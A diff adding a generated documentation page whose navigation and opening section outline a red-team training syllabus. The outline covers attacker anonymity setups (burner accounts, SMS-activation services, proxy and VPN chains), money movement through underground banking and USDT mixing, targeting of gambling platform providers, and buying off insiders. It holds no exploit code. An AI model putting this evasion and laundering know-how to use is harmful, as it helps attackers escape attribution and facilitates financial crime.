+  <a href="#penetration-strike-breakthrough-ideas-and-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Penetration-Strike Breakthrough Ideas and Methods
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Penetration-Strike Breakthrough Ideas and Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#black-box-rapid-initial-access-approach" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Black-Box Rapid Initial-Access Approach
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-vulnerability-principles-and-exploitation-tools-and-approaches" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Vulnerability Principles and Exploitation Tools and Approaches
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#trace-cleanup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trace cleanup
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#code-audit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        **Code Audit **
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="**Code Audit **">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hands-on-java-code-audit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hands-on Java Code Audit
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hands-on Java Code Audit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bc-site-source-code-audit-for-getshell-hands-on" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BC Site Source-Code Audit for Getshell (Hands-on)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cp-site-source-code-audit-for-getshell-hands-on" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CP Site Source-Code Audit for Getshell (Hands-on)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java-deserialization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Java Deserialization
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hands-on-php-code-audit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hands-on PHP Code Audit
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hands-on PHP Code Audit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bc-site-source-code-audit-for-getshell-hands-on_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BC Site Source-Code Audit for Getshell (Hands-on)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" >
+        
+          
+          <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    简体中文
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_27">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    简体中文
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. 反溯源与匿名化
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. 信息收集
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. 渗透实战
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. 代码审计
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. 后渗透与内网横向
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-06/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. 服务器及个人PC信息收集
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-07/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. 钓鱼
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-08/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. 远控工具开发
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-09/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9. 木马免杀
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10. 调证镜像系统还原(Linux)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-11/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11. 实战字典与工具包
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-12/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12. AI赋能攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-13/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13. 云原生攻防
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-14/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14. 现代C2演进
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-15/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15. 高级规避技术
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-16/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16. 最新AD/基础设施攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-17/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17. 初始访问演进
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-18/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18. Cloud Post-Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-19/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19. HW/红蓝对抗实战专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-20/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20. 零信任环境绕过
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-21/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21. OT/ICS工控安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-22/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22. 移动端攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-23/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23. Living off the Land (LotL) 攻击链
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/ch-24/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24. 过时内容警告与替代方案
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zh-CN/appendix/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    附录 — 原始大纲
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#anti-attribution-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        (Anti-)Attribution Techniques
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="(Anti-)Attribution Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#work-environment-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Work Environment Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Work Environment Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#host-disk-encryption" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Host Disk Encryption
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#virtual-machine-environment-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Virtual Machine Environment Configuration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#personal-information-cleanup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Personal Information Cleanup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#android-vm-physical-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Android VM + Physical Machine
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#whom-anti-attribution-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Whom Anti-Attribution Targets
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#which-chains-were-built" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Which Chains Were Built
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-information-each-hop-of-the-chain-leaks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What Information Each Hop of the Chain Leaks
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#who-can-obtain-this-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Who Can Obtain This Information
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#time-cost" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Time Cost?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#required-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Required Permissions
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-environment-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network Environment Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Network Environment Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#anonymous-work-chain-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Anonymous Work Chain Configuration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#penetration-testing-environment-and-tool-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Penetration Testing Environment and Tool Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Penetration Testing Environment and Tool Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#create-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create Accounts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Wordlists
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#httpslcxccpost3213" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        https://lcx.cc/post/3213/
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#white-label-igaming-platform-providers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        White-Label iGaming Platform Providers
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="White-Label iGaming Platform Providers">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#financier-provides-site-building-servicesdevelopment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Financier -&gt; provides site-building services/development
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#counterintelligence-and-counter-espionage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Counterintelligence and Counter-espionage
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Counterintelligence and Counter-espionage">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#commercial-espionage-content-deleted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Commercial Espionage (content deleted)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#geopolitical-confrontation-spies-of-different-regimes-content-deleted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Geopolitical Confrontation | Spies of Different Regimes (content deleted)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reconnaissance
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#website-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Website Reconnaissance
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Website Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sgk-data-source-collection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SGK data source collection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-to-look-at-once-you-have-a-site" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What to Look at Once You Have a Site
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#open-source-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Open-Source Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#supply-chain-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Supply Chain Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#osint-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OSINT Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-cdn" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypass CDN
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#practical-attribution-of-site-building-companies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Practical Attribution of Site-Building Companies
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Practical Attribution of Site-Building Companies">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attribution-of-gambling-white-label-platform-providers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attribution of Gambling White-Label Platform Providers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attribution-of-gang-member-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attribution of Gang Member Information
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#penetration-strike-breakthrough-ideas-and-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Penetration-Strike Breakthrough Ideas and Methods
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Penetration-Strike Breakthrough Ideas and Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#black-box-rapid-initial-access-approach" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Black-Box Rapid Initial-Access Approach
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-vulnerability-principles-and-exploitation-tools-and-approaches" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Vulnerability Principles and Exploitation Tools and Approaches
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#trace-cleanup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trace cleanup
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#code-audit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        **Code Audit **
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="**Code Audit **">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hands-on-java-code-audit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hands-on Java Code Audit
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hands-on Java Code Audit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bc-site-source-code-audit-for-getshell-hands-on" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BC Site Source-Code Audit for Getshell (Hands-on)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cp-site-source-code-audit-for-getshell-hands-on" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CP Site Source-Code Audit for Getshell (Hands-on)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#java-deserialization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Java Deserialization
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hands-on-php-code-audit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hands-on PHP Code Audit
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hands-on PHP Code Audit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bc-site-source-code-audit-for-getshell-hands-on_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BC Site Source-Code Audit for Getshell (Hands-on)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="red-team-training-syllabus">Red Team Training Syllabus</h1>
+<blockquote>
+<p>Source: Feishu document mind map</p>
+</blockquote>
+<h2 id="anti-attribution-techniques">(Anti-)Attribution Techniques</h2>
+<h3 id="work-environment-configuration">Work Environment Configuration</h3>
+<h4 id="host-disk-encryption">Host Disk Encryption</h4>
+<ul>
+<li>veracrypt</li>
+<li><a href="https://www.veracrypt.fr/en/Downloads.html">https://www.veracrypt.fr/en/Downloads.html</a></li>
+</ul>
+<h4 id="virtual-machine-environment-configuration">Virtual Machine Environment Configuration</h4>
+<ul>
+<li>Remove Bluetooth and the NAT network adapter</li>
+<li>shadow defender</li>
+<li>Mount a shared folder to place files</li>
+<li>Keep the penetration machine separate from the reporting machine</li>
+<li>Do not allow WPS to sync documents</li>
+<li>mybase</li>
+<li>keepass</li>
+</ul>
+<h4 id="personal-information-cleanup">Personal Information Cleanup</h4>
+<ul>
+<li>Never use personal IDs</li>
+<li>Never use historical passwords</li>
+<li>Never use historical accounts</li>
+<li>Discard accounts after a single use</li>
+<li>Create anonymous email accounts</li>
+<li>protonmail<ul>
+<li><a href="https://protonmail.com/">https://protonmail.com/</a></li>
+</ul>
+</li>
+<li>outlook<ul>
+<li><a href="https://www.microsoft.com/zh-cn/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook?deeplink=%2fowa%2f&amp;sdf=0">https://www.microsoft.com/zh-cn/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook?deeplink=%2fowa%2f&amp;sdf=0</a></li>
+</ul>
+</li>
+<li>Create an SMS-activation service account</li>
+<li><a href="https://sms-activate.io/">https://sms-activate.io/</a></li>
+<li>Device purchase (second-hand)</li>
+<li>Device ID</li>
+<li>wifi bssid<ul>
+<li>netsh wlan show networks mode=bssid</li>
+</ul>
+</li>
+<li>SIM card purchase</li>
+<li>Offline</li>
+<li>Secondary SIM</li>
+<li>Telegram purchase</li>
+<li>Not with your own phone number</li>
+<li>Cryptocurrency</li>
+<li>Cold wallet/cash (domestic underground banking transactions) -&gt; USDT -&gt; multi-currency mixing -&gt; USDT<ul>
+<li>Anonymous money-laundering loss 7%-10%</li>
+<li>Money-laundering firms and underground banking, plus commission, bring the loss to 30%</li>
+</ul>
+</li>
+</ul>
+<h4 id="android-vm-physical-machine">Android VM + Physical Machine</h4>
+<h4 id="whom-anti-attribution-targets">Whom Anti-Attribution Targets</h4>
+<ul>
+<li>Gambling white-label platform providers</li>
+<li>IP<ul>
+<li>Account</li>
+</ul>
+</li>
+</ul>
+<h4 id="which-chains-were-built">Which Chains Were Built</h4>
+<h4 id="what-information-each-hop-of-the-chain-leaks">What Information Each Hop of the Chain Leaks</h4>
+<h4 id="who-can-obtain-this-information">Who Can Obtain This Information</h4>
+<h4 id="time-cost">Time Cost?</h4>
+<h4 id="required-permissions">Required Permissions</h4>
+<h3 id="network-environment-configuration">Network Environment Configuration</h3>
+<h4 id="anonymous-work-chain-configuration">Anonymous Work Chain Configuration</h4>
+<ul>
+<li>Anonymous host environment selection</li>
+<li>Non-mainland regions<ul>
+<li>shockhosting</li>
+<li><a href="http://psychz.net">psychz.net</a></li>
+<li>Not Hong Kong Alibaba Cloud</li>
+<li>Amazon Web Services</li>
+<li>cf</li>
+<li>jtti.cc</li>
+</ul>
+</li>
+<li>Preferably supports USDT</li>
+<li>Do not pick hosts from the same hosting provider</li>
+<li>Chain setup</li>
+<li>Overseas data SIM -&gt; frp -&gt; SoftEther VPN -&gt; lunaproxy (dynamic residential proxy)</li>
+<li><a href="https://github.com/SoftEtherVPN/SoftEtherVPN_Stable">https://github.com/SoftEtherVPN/SoftEtherVPN_Stable</a></li>
+<li>Overseas data SIM -&gt; lunaproxy -&gt; traffic proxy<ul>
+<li><a href="https://suying999.net/auth/login">https://suying999.net/auth/login</a></li>
+</ul>
+</li>
+<li>Domestic data SIM -&gt; SoftEther VPN -&gt; traffic proxy</li>
+<li>Anonymous traffic device</li>
+<li>VPN configuration and trace cleanup</li>
+</ul>
+<h3 id="penetration-testing-environment-and-tool-configuration">Penetration Testing Environment and Tool Configuration</h3>
+<h4 id="create-accounts">Create Accounts</h4>
+<ul>
+<li>github</li>
+<li><a href="https://securitytrails.com/">https://securitytrails.com/</a></li>
+<li>The world's largest intelligence vendor</li>
+<li><a href="https://search.censys.io/">https://search.censys.io/</a></li>
+<li>Updates daily<ul>
+<li>rustscan</li>
+</ul>
+</li>
+<li>fofa/hunter (not allowed to log in from the live VM)</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>ffuf</li>
+<li>Cloud drive archive</li>
+<li><a href="https://pan.baidu.com/s/1AL9YxaSvh0TpfBtnWe_LCw?pwd=431d">https://pan.baidu.com/s/1AL9YxaSvh0TpfBtnWe_LCw?pwd=431d</a></li>
+</ul>
+<h4 id="wordlists">Wordlists</h4>
+<ul>
+<li><a href="https://github.com/9bie/dict">https://github.com/9bie/dict</a></li>
+<li><a href="https://github.com/SexyBeast233/SecDictionary">https://github.com/SexyBeast233/SecDictionary</a></li>
+<li><a href="https://github.com/r00tSe7en/MyDict">https://github.com/r00tSe7en/MyDict</a></li>
+</ul>
+<h3 id="httpslcxccpost3213"><a href="https://lcx.cc/post/3213/">https://lcx.cc/post/3213/</a></h3>
+<h3 id="white-label-igaming-platform-providers">White-Label iGaming Platform Providers</h3>
+<h4 id="financier-provides-site-building-servicesdevelopment">Financier -&gt; provides site-building services/development</h4>
+<ul>
+<li>Code + setup</li>
+<li>Code + setup + operations</li>
+<li>Self-built site</li>
+<li>Gambling -&gt; page links to a large batch of sites</li>
+</ul>
+<h3 id="counterintelligence-and-counter-espionage">Counterintelligence and Counter-espionage</h3>
+<h4 id="commercial-espionage-content-deleted">Commercial Espionage (content deleted)</h4>
+<ul>
+<li>How to buy off an insider</li>
+<li>Commercial consulting firm playbook</li>
+<li>How to sell out an insider</li>
+<li>How to investigate and root out an insider</li>
+<li>Analysis and attribution of stolen-data supply chains</li>
+</ul>
+<h4 id="geopolitical-confrontation-spies-of-different-regimes-content-deleted">Geopolitical Confrontation | Spies of Different Regimes (content deleted)</h4>
+<h2 id="reconnaissance"><strong>Reconnaissance</strong></h2>
